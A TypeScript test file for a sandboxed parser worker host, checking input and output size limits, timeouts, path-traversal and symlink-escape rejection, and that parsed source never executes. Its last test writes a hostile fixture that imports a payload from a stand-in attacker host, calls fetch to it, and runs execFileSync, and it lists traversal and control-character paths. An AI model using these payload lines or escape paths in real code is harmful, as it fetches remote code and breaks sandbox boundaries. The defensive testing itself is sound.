import { EventEmitter } from 'node:events';
import { mkdtemp, mkdir, realpath, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { WorkerOptions } from 'node:worker_threads';

import { afterEach, describe, expect, it, vi } from 'vitest';

import { DEFAULT_PARSER_LIMITS, type ParserLimitsV1 } from '../types.js';
import type { AdapterWorkerRequestV1 } from '../worker-protocol.js';
import { runAdapterWorker, WORKER_DIAGNOSTICS } from '../worker-host.js';

const temporaryDirectories: string[] = [];

async function temporaryRoot(): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'lux-parser-safety-'));
  temporaryDirectories.push(root);
  return root;
}

function request(
  root: string,
  filePath: string,
  limits: Partial<ParserLimitsV1> = {}
): AdapterWorkerRequestV1 {
  return {
    schemaVersion: 1,
    adapterId: 'tree-sitter',
    input: {
      corpusRoot: root,
      allowedRoots: [root],
      filePath,
      limits: { ...DEFAULT_PARSER_LIMITS, ...limits },
    },
  };
}

function fixture(name: string): URL {
  return new URL(`./fixtures/worker/${name}`, import.meta.url);
}

class NeverWorker extends EventEmitter {
  terminate = vi.fn(async () => 0);
}

afterEach(async () => {
  await Promise.all(
    temporaryDirectories.splice(0).map((path) => rm(path, { recursive: true, force: true }))
  );
});

describe('bounded parser worker host', () => {
  it('accepts an input exactly at maxBytes', async () => {
    const root = await temporaryRoot();
    const file = join(root, 'exact.ts');
    const source = 'export const exact = 1;';
    await writeFile(file, source);

    const result = await runAdapterWorker(
      request(root, file, { maxBytes: Buffer.byteLength(source) })
    );

    expect(result.ok).toBe(true);
  });

  it('rejects an input over 2 MiB before worker construction', async () => {
    const root = await temporaryRoot();
    const file = join(root, 'oversized.ts');
    await writeFile(file, Buffer.alloc(DEFAULT_PARSER_LIMITS.maxBytes + 1, 0x20));
    const createWorker = vi.fn((_url: URL, _options: WorkerOptions) => new NeverWorker());

    const result = await runAdapterWorker(request(root, file), { createWorker });

    expect(result).toEqual({
      schemaVersion: 1,
      ok: false,
      diagnostic: { code: 'limit', message: WORKER_DIAGNOSTICS.fileLimit },
    });
    expect(createWorker).not.toHaveBeenCalled();
  });

  it('actually terminates a hard-hung worker at timeout with bounded grace', async () => {
    const root = await temporaryRoot();
    const file = join(root, 'input.ts');
    await writeFile(file, 'export const value = 1;');
    const started = Date.now();

    const result = await runAdapterWorker(request(root, file, { timeoutMs: 40 }), {
      workerUrl: fixture('hang-adapter.mjs'),
    });

    expect(result).toEqual({
      schemaVersion: 1,
      ok: false,
      diagnostic: { code: 'timeout', message: WORKER_DIAGNOSTICS.timeout },
    });
    expect(Date.now() - started).toBeLessThan(1_000);
  });

  it('calls terminate and waits no longer than the 250 ms grace', async () => {
    const root = await temporaryRoot();
    const file = join(root, 'input.ts');
    await writeFile(file, 'export const value = 1;');
    const worker = new NeverWorker();
    worker.terminate = vi.fn(() => new Promise<number>(() => undefined));
    const started = Date.now();

    const result = await runAdapterWorker(request(root, file, { timeoutMs: 5 }), {
      createWorker: () => worker,
    });

    expect(result.ok).toBe(false);
    expect(!result.ok && result.diagnostic.code).toBe('timeout');
    expect(worker.terminate).toHaveBeenCalledOnce();
    expect(Date.now() - started).toBeGreaterThanOrEqual(200);
    expect(Date.now() - started).toBeLessThan(1_000);
  });

  it('rejects a response over 8 MiB before attempting JSON decoding', async () => {
    const root = await temporaryRoot();
    const file = join(root, 'input.ts');
    await writeFile(file, 'export const value = 1;');

    const result = await runAdapterWorker(request(root, file), {
      workerUrl: fixture('oversized-result-adapter.mjs'),
    });

    expect(result).toEqual({
      schemaVersion: 1,
      ok: false,
      diagnostic: { code: 'limit', message: WORKER_DIAGNOSTICS.resultLimit },
    });
  });

  it.each([
    ['NUL', 'bad\0.ts'],
    ['control character', 'bad\ntest.ts'],
    ['traversal', '../outside.ts'],
    ['URI', 'file:///tmp/outside.ts'],
  ])('rejects %s paths before worker construction', async (_label, unsafePath) => {
    const root = await temporaryRoot();
    const createWorker = vi.fn((_url: URL, _options: WorkerOptions) => new NeverWorker());

    const result = await runAdapterWorker(request(root, unsafePath), { createWorker });

    expect(result.ok).toBe(false);
    expect(!result.ok && result.diagnostic.code).toBe('path-escape');
    expect(createWorker).not.toHaveBeenCalled();
  });

  it('allows an in-root symlink but rejects a symlink escape before spawn', async () => {
    const parent = await temporaryRoot();
    const root = join(parent, 'root');
    const outside = join(parent, 'outside');
    await mkdir(root);
    await mkdir(outside);
    await writeFile(join(root, 'inside.ts'), 'export const inside = true;');
    await writeFile(join(outside, 'outside.ts'), 'throw new Error("must never execute");');
    await symlink(join(root, 'inside.ts'), join(root, 'inside-link.ts'));
    await symlink(join(outside, 'outside.ts'), join(root, 'outside-link.ts'));

    const insideResult = await runAdapterWorker(request(root, join(root, 'inside-link.ts')));
    const createWorker = vi.fn((_url: URL, _options: WorkerOptions) => new NeverWorker());
    const outsideResult = await runAdapterWorker(request(root, join(root, 'outside-link.ts')), {
      createWorker,
    });

    expect(insideResult.ok).toBe(true);
    expect(outsideResult.ok).toBe(false);
    expect(!outsideResult.ok && outsideResult.diagnostic.code).toBe('path-escape');
    expect(createWorker).not.toHaveBeenCalled();
  });

  it('canonicalizes roots and file path before passing workerData', async () => {
    const parent = await temporaryRoot();
    const root = join(parent, 'root');
    await mkdir(root);
    await mkdir(join(root, 'nested'));
    await writeFile(join(root, 'input.ts'), 'export const value = 1;');
    let received: unknown;
    const worker = new NeverWorker();
    const createWorker = vi.fn((_url: URL, options: WorkerOptions) => {
      received = options.workerData;
      queueMicrotask(() => worker.emit('error', new Error('expected stop')));
      return worker;
    });

    await runAdapterWorker(
      request(join(root, 'nested', '..'), join(root, 'nested', '..', 'input.ts')),
      { createWorker }
    );

    const canonicalRoot = await realpath(root);
    const wire = received as { request: AdapterWorkerRequestV1 };
    expect(wire.request.input.corpusRoot).toBe(canonicalRoot);
    expect(wire.request.input.allowedRoots).toEqual([canonicalRoot]);
    expect(wire.request.input.filePath).toBe(await realpath(join(root, 'input.ts')));
  });

  it('parses source as data without command, network, module, or out-root execution', async () => {
    const parent = await temporaryRoot();
    const root = join(parent, 'root');
    const marker = join(parent, 'executed');
    await mkdir(root);
    const file = join(root, 'hostile.ts');
    await writeFile(
      file,
      [
        "import 'https://attacker.invalid/payload.js';",
        "import '../../outside.js';",
        "import { execFileSync } from 'node:child_process';",
        `execFileSync('touch', [${JSON.stringify(marker)}]);`,
        "fetch('https://attacker.invalid/');",
      ].join('\n')
    );

    const result = await runAdapterWorker(request(root, file));

    expect(result.ok).toBe(true);
    await expect(realpath(marker)).rejects.toThrow();
  });
});
